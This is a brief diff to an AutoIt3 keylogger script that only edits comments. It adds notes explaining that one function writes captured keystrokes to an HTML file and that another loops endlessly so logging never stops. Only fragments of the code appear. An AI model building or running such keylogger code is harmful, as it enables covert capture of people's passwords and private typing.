@@ -24,7 +24,7 @@
 ; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 ; THE SOFTWARE.
 
-; This AutoIt3 can be used to produce easy to read HTML-Files which contain 
+; This AutoIt3-Script can be used to produce easy to read HTML-Files which contain 
 ; the output of a keylogger.
 
 ; Initializes the HTML-File and all global Variables
@@ -392,6 +392,7 @@ Func _getPressedKey()
 
 	 EndFunc
 
+; Takes the key and writes it to the file
 Func _read()
    $last = $key
    _getPressedKey()
@@ -401,6 +402,7 @@ Func _read()
    Sleep(40) ; Waiting just to keep the CPU-usage at a minimum
 EndFunc
 
+; A endless loop of reading (so the keylogger won't stop reading)
 Func _run()
    While 1
 	   _read()
